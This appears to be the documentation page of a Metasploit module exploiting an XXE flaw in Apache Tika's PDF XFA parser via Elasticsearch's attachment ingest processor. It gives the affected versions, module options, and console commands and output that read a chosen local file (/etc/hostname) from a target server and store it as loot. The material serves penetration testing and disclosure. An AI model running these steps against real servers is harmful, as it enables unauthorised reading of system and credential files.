## Vulnerable Application

This module exploits an XML External Entity vulnerability in Apache Tika's
PDF XFA parser through the Elasticsearch `attachment` ingest processor.

The issue is tracked as CVE-2025-54988. Apache subsequently assigned
CVE-2025-66516 to the same underlying vulnerability for a broader affected
package scope.

The module was validated against:

- Elasticsearch 8.19.2: vulnerable
- Elasticsearch 8.19.3: patched

The target must have the attachment ingest processor available. The
authenticated user must be permitted to create, simulate, and delete ingest
pipelines.

No Elasticsearch index or document is created.

## Verification Steps

1. Install a vulnerable Elasticsearch version with the attachment processor
   available.
2. Start Metasploit Framework.
3. Run:

       use auxiliary/scanner/http/elasticsearch_tika_xfa_xxe
       set RHOSTS <target>
       set RPORT 9200
       set FILEPATH /etc/hostname
       check
       run

4. Confirm that the selected file is returned.
5. Confirm that the temporary ingest pipeline is deleted.

## Options

### AUTHORIZATION

An optional complete HTTP `Authorization` header value.

Examples:

       set AUTHORIZATION Basic <base64-value>
       set AUTHORIZATION ApiKey <api-key-value>

### FILEPATH

The absolute path of the local file to retrieve.

The default value is:

       /etc/hostname

### INDEXED_CHARS

The maximum number of characters extracted by the Elasticsearch attachment
processor.

The default value is:

       1048576

A value of `-1` requests unlimited extraction.

### STORE_LOOT

Stores extracted content in the Metasploit loot directory when enabled.

## Scenarios

### Elasticsearch 8.19.2

       msf6 > use auxiliary/scanner/http/elasticsearch_tika_xfa_xxe
       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > set RHOSTS 127.0.0.1
       RHOSTS => 127.0.0.1
       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > set RPORT 9200
       RPORT => 9200
       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > set FILEPATH /etc/hostname
       FILEPATH => /etc/hostname
       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > check
       [+] 127.0.0.1:9200 - The target appears to be vulnerable.
       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > run
       [*] 127.0.0.1:9200 - Creating temporary ingest pipeline [...]
       [+] 127.0.0.1:9200 - Read /etc/hostname (...)
       [+] 127.0.0.1:9200 - Loot stored in: [...]
       [*] Auxiliary module execution completed

### Elasticsearch 8.19.3

       msf6 auxiliary(scanner/http/elasticsearch_tika_xfa_xxe) > check
       [-] 127.0.0.1:9200 - The target is not exploitable.
       Elasticsearch 8.19.3 is outside the affected version ranges
